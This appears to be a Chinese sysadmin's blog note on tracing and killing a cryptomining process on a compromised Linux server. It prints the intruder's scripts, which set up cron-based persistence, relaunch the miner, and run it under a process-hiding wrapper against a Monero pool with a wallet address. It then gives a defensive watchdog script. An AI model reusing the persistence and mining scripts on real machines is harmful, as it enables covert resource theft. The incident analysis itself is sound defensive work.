# 查杀挖矿机进程md
用`top`命令查看到md（占用cpu近100%）的PID是4444（假设是这个数字）
每个PID都会有文件夹`/proc/PID`, 所以
```
[root@localhost ~]# cd /proc/4444
[root@localhost 4444]# ll
-r--------. 1 Hazard Liulab        304 Nov 22 20:24 auxv
--w-------. 1 Hazard Liulab          0 Nov 22 20:24 clear_refs
-r--r--r--. 1 Hazard Liulab        414 Nov 22 20:24 cmdline
-rw-r--r--. 1 Hazard Liulab          3 Nov 22 20:24 comm
lrwxrwxrwx. 1 Hazard Liulab         15 Nov 22 20:24 cwd -> /lib/modules/.z
-r--------. 1 Hazard Liulab       3799 Nov 22 20:24 environ
lrwxrwxrwx. 1 Hazard Liulab         18 Nov 22 20:24 exe -> /lib/modules/.z/md
dr-x------. 2 Hazard Liulab       4096 Nov 22 20:24 fd
dr-x------. 2 Hazard Liulab       4096 Nov 22 20:24 fdinfo
-rw-------. 1 Hazard Liulab       1323 Nov 22 20:24 limits
-r--r--r--. 1 Hazard Liulab      16529 Nov 22 20:24 maps
-rw-------. 1 Hazard Liulab          0 Nov 22 20:24 mem
-r--r--r--. 1 Hazard Liulab       1489 Nov 22 20:24 mountinfo
-r--r--r--. 1 Hazard Liulab       1278 Nov 22 20:24 mounts
dr-x--x--x. 2 Hazard Liulab       4096 Nov 22 20:24 ns
-r--r--r--. 1 Hazard Liulab      10351 Nov 22 20:24 numa_maps
-r--r--r--. 1 Hazard Liulab 2823852032 Nov 22 20:24 pagemap
-r--r--r--. 1 Hazard Liulab          9 Nov 22 20:24 personality
lrwxrwxrwx. 1 Hazard Liulab          1 Nov 22 20:24 root -> /
-rw-r--r--. 1 Hazard Liulab       2403 Nov 22 20:24 sched
-r--r--r--. 1 Hazard Liulab     130825 Nov 22 20:24 smaps
-r--r--r--. 1 Hazard Liulab        233 Nov 22 20:24 stat
-r--r--r--. 1 Hazard Liulab         34 Nov 22 20:24 statm
-r--r--r--. 1 Hazard Liulab        936 Nov 22 20:24 status
-r--r--r--. 1 Hazard Liulab         67 Nov 22 20:24 syscall
```     
重点关注`cmdline` 和 `exe`, `cwd` 等  
`cwd` 指向 `/lib/modules/.z` (这个目录里放着挖矿的程序)  
`exe` 指向 `/lib/modules/.z/md` (这个就是占用100%cpu的家伙)  
```
[root@localhost 4444]# cat cmdline
-bash -acryptonight-os tratum+tcp://pool.minexmr.com:7777......(我给省略了一些字符，(￣▽￣)")
```
这里看到这些字样，`pool.minexmr.com` 基本上跟挖矿有关了   
```
[root@localhost 4444]# cd /lib/modules/.z/
[root@localhost .z]# ll
-rw-r--r--. 1 root root       0 Nov 23 15:40 $
-rwxr-xr-x. 1 root root     332 Oct  5 03:07 a
-rw-r--r--. 1 root root       1 Nov 23 18:07 bash.pid
-rwxr-xr-x. 1 1001 1001   15125 Feb 21  2016 h32
-rwxr-xr-x. 1 1001 1001  838583 Feb 21  2016 h64
-rwxr-xr-x. 1 root root 2979640 Jun 24 04:19 md
-rwxr-xr-x. 1 root root  168896 Sep 27 18:58 mdx
-rwxr-xr-x. 1 root root     533 Nov 19 22:41 run
-rw-r--r--. 1 root root    4833 Nov 23 16:24 screenlog.0
-rwxr-xr-x. 1 root root      24 Oct  5 02:45 x
```   
 `h32`, `h64`, `md`, `mdx`都是二进制文件  
 我们可以从`a`, `run`, `x` 三个文件里看到些端倪  
```
[root@localhost .z]# cat a 
pwd > dir.dir
dir=$(cat dir.dir)
echo "* * * * * $dir/upd >/dev/null 2>&1" > cron.d
crontab cron.d
crontab -l | grep upd
echo "#!/bin/sh
if test -r $dir/bash.pid; then
pid=\$(cat $dir/bash.pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > upd
chmod u+x upd
rm -rf ../dwk.tgz
rm -rf ../z.sh
```
 `cron.d` 和 `upd` 文件都没有找到，使用`locate` 命令，也没有搜索到，  
 使用`kill 4444` 之后，停几个小时，`md`会重新执行（即使给.z文件夹改名也没用，删除也没有用，还是会启动）  
  怀疑存在父进程，或定时任务，但是使用`crontab -l` 查看没有定时任务（无语）  
```
[root@localhost .z]# cat run  
#!/bin/bash

proc=`nproc`
ARCH=`uname -m`
HIDE="-bash"

if [ "$ARCH" == "i686" ];       then
        ./h32 -s $HIDE ./md -a cryptonight -o stratum+tcp://pool.minexmr.com:7777 -u 45MmwEsgnjtHynmvDDV8pbZJibfhFVjtV9cTaFW4H8N9hNZDpMoYr7J1ZCE3wJAjWN9Dj3iASPxtjEKNZEriwJjx2evayFY -p x >>$
elif [ "$ARCH" == "x86_64" ];   then
        ./h64 -s $HIDE ./md -a cryptonight -o stratum+tcp://pool.minexmr.com:7777 -u 45MmwEsgnjtHynmvDDV8pbZJibfhFVjtV9cTaFW4H8N9hNZDpMoYr7J1ZCE3wJAjWN9Dj3iASPxtjEKNZEriwJjx2evayFY -p x >>$
fi
echo $! > bash.pid
```
```
[root@localhost .z]# cat x
nohup ./a >>/dev/null &
```
-------------
# 暂时的解决方法
 无奈只能曲线救国，写了一个守护进程，一旦看到`md`运行就`kill`掉它   
 其中`ps -ef` 结果的第三列是父进程，为了追综始作俑者。  
 一般命令行运行的程序好像父进程是1？  
 
 把下面的代码复制到`watchMD.sh`中（记得改一下里面`file_name`的路径），  
 然后`nohup sh watchMD.sh &`即可每隔`2s`监控一次，碰到`md`就杀  
 改一下`proc_name`（支持正则表达式），可以神挡杀神
```
#!/bin/sh
proc_name="^md$" 
file_name="/data2/lzc/watchMD.log"

echo `date` = NUM = PID > $file_name
while true
do
 num=`pgrep -x "$proc_name" | wc -l`
 if [ 0 -lt $num ]
 then
    pid=`pgrep -x "$proc_name"`
    ps -ef | grep $pid | grep -v grep >> $file_name
    echo == >> $file_name
    par=(`ps -ef | grep $pid | grep -v grep | cut -f3`)
    ps -ef | grep ${par[0]} | grep -v grep >> $file_name
    echo ==== >> $file_name
    kill $pid
    echo `date` =  $num  = $pid >> $file_name
 fi
 sleep 2
done  
```
